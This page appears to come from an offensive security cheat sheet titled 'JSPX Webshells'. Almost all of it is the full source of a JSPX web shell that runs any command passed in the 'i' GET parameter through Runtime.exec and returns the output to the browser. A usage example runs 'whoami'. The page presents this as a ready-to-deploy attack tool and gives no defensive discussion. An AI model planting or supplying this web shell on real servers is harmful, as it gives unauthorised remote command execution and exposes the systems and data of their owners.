---
description: JSPX Webshells
---

# JSPX

### Basic (GET) JSPX Webshell

**Usage:** _webshell.jspx?i=whoami_

{% code overflow="wrap" %}
```java
<?xml version="1.0" encoding="UTF-8"?>
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
<jsp:directive.page import="java.util.*"/>
<jsp:directive.page import="java.io.*"/>
    <jsp:directive.page contentType="text/html" pageEncoding="UTF-8"/>
    
    <jsp:scriptlet>
          String command = request.getParameter("i");
          Process proc = Runtime.getRuntime().exec(command);
  
	  BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
	  String line;
	  while ((line = reader.readLine()) != null) {
	    out.println(line);
	  }
    </jsp:scriptlet>

</jsp:root>

```
{% endcode %}
